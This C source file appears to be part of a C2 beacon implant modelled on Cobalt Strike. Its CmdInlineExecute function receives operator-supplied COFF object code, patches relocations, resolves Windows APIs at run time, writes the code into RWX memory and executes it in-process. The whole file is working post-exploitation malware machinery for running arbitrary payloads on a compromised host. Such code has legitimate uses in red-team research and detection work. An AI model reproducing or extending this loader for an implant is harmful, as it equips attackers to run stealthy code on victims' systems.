#include "Bof.h"
#include "Command.h"

void* FindOrAddDynamicFunction(Beacon_Internal_Api* api, void* new_func)
{
	int i;

	for (i = 0; i < 32; i++) {
		if (api->dynamicFns[i] == new_func)
			return &(api->dynamicFns[i]);
	}

	for (i = 0; i < 32; i++) {
		if (api->dynamicFns[i] == NULL) {
			api->dynamicFns[i] = new_func;
			return &(api->dynamicFns[i]);
		}
	}

	return NULL;
}

// 仅支持 x64 环境下的 coff 加载
BOOL processRelocation(PBEACON_RELOCATION p_beacon_reloc, unsigned char* text, unsigned char* lpTextStartAddress, unsigned char* section, unsigned long in_offset) {
	// 不能直接写 p_beacon_reloc->relocType < 10
	// 因为 relocType 为 unsigned short 无符号
	if (p_beacon_reloc->relocType >= 4 && p_beacon_reloc->relocType <= 9)
	{
	    // 由于这里是32相对偏移，先判断偏移是否在 -2GB - 2GB 范围内
		DWORD64 offset = *(DWORD*)(text + p_beacon_reloc->rvaddre) + (DWORD64)(section + in_offset) - (DWORD64)(lpTextStartAddress + p_beacon_reloc->rvaddre + p_beacon_reloc->relocType);
		if (offset + (UINT_MAX / 2 + 1) > UINT_MAX)
		{
			fprintf(stderr, "Relocation truncated to fit (distance between executable code and other data is >4GB)\n");
			return FALSE;
		}
		*(long*)(text + p_beacon_reloc->rvaddre) = *(long*)(text + p_beacon_reloc->rvaddre) + (long)(section + in_offset) - (long)(lpTextStartAddress + p_beacon_reloc->rvaddre + p_beacon_reloc->relocType);
	}
	else
	{
		fprintf(stderr, "Un-implemented relocation type %d", p_beacon_reloc->relocType);
		return FALSE;
	}

	return TRUE;
}

VOID CmdInlineExecute(unsigned char* command_buffer, size_t command_length) {
	// Beacon 内部 API
	Beacon_Internal_Api* api = malloc(sizeof(Beacon_Internal_Api));
	if (!api) {
		fprintf(stderr, "Memoryt allocation failed\n");
		return;
	}

	// API 赋值
	BeaconInternalAPI(api);

	// 入口函数偏移
	datap parse;
	BeaconDataParse(&parse, command_buffer, command_length);
	int entryPoint = BeaconDataInt(&parse);

	// 代码段
	sizedbuf text_buf;
	unsigned char* text = BeaconDataLengthAndString(&parse, &text_buf);
	int text_length = text_buf.size;

	// .rdata
	sizedbuf rdata_buf;
	unsigned char* rdata = BeaconDataLengthAndString(&parse, &rdata_buf);

	// .data
	sizedbuf data_buf;
	unsigned char* data = BeaconDataLengthAndString(&parse, &data_buf);

	// Beacon 自定义的重定位结构
	sizedbuf relocations_buf;
	unsigned char* relocations = BeaconDataLengthAndString(&parse, &relocations_buf);

	// 入口函数参数
	sizedbuf bytesBuf;
	unsigned char* bytes = BeaconDataLengthAndString(&parse, &bytesBuf);

	unsigned char* lpTextStartAddress = (unsigned char*)VirtualAlloc(NULL, text_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpTextStartAddress)
	{
		fprintf(stderr, "VirtualAlloc failed with error:%lu\n", GetLastError());
		free(api);
		return;
	}

	datap relocations_parser;
	BeaconDataParse(&relocations_parser, relocations, relocations_buf.size);

	for (BEACON_RELOCATION* reloc = (BEACON_RELOCATION*)BeaconDataPtr(&relocations_parser, sizeof(BEACON_RELOCATION));
		reloc->beaconRelocType.secType != END_RELOC_TYPE; reloc = (BEACON_RELOCATION*)BeaconDataPtr(&relocations_parser, sizeof(BEACON_RELOCATION))) {
		BOOL result;
		if (reloc->beaconRelocType.secType == RDATA_RELOC_TYPE) {
			result = processRelocation(reloc, text, lpTextStartAddress, rdata, reloc->value);
		}
		else if (reloc->beaconRelocType.secType == DATA_RELOC_TYPE) {
			result = processRelocation(reloc, text, lpTextStartAddress, data, reloc->value);
		}
		else if (reloc->beaconRelocType.secType == EXE_RELOC_TYPE) {
			result = processRelocation(reloc, text, lpTextStartAddress, lpTextStartAddress, reloc->value);
		}
		else {
			// 内部函数
			// funcType 表明序号
			if (reloc->beaconRelocType.funcType != DYNAMIC_FUNC_RELOC_TYPE) {
				result = processRelocation(reloc, text, lpTextStartAddress, (unsigned char*)api + (reloc->beaconRelocType.funcType * sizeof(unsigned char*)), 0);
			}
			// 外部函数，紧跟着 BEACON_RELOCATION 结构
			// length(4 bytes) || module_name(length bytes)
			// length(4 bytes) || func_name(length bytes)
			else {
				void* ptr;
				void* slot;
				LPSTR module_name = BeaconDataStringPointer(&relocations_parser);
				LPSTR func_name = BeaconDataStringPointer(&relocations_parser);
				HMODULE hModule = GetModuleHandleA(module_name);
				if (!hModule) {
					LoadLibraryA(module_name);
				}
				hModule = GetModuleHandleA(module_name);
				if(!hModule)
				{
					fprintf(stderr, "Could not load module %s\n", module_name);
					goto cleanup;
				}
				ptr = GetProcAddress(hModule, func_name);
				if (!ptr)
				{
					fprintf(stderr, "Could not load API %s\n", func_name);
					goto cleanup;
				}
				slot = FindOrAddDynamicFunction(api, ptr);
				if (!slot) {
					fprintf(stderr, "No slot for function (reduce number of Win32 APIs called)\n");
					goto cleanup;
				}
				result = processRelocation(reloc, text, lpTextStartAddress, (unsigned char*)slot, 0);
			}
		}
		if (!result) goto cleanup;
	}
	memcpy(lpTextStartAddress, text, text_length);
	memset(text, 0, text_length);

	DWORD oldProtect;
	// 修改内存权限 RWX
	if (!VirtualProtect(lpTextStartAddress, text_length, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		fprintf(stderr, "VirtualProtect failed with error:%lu\n", GetLastError());
		return;
	}
	// 执行入口函数
	((void(*)(unsigned char*, int))(lpTextStartAddress + entryPoint))(bytes, bytesBuf.size);

cleanup:
	VirtualFree(lpTextStartAddress, 0, MEM_RELEASE);
	free(api);
	return;
}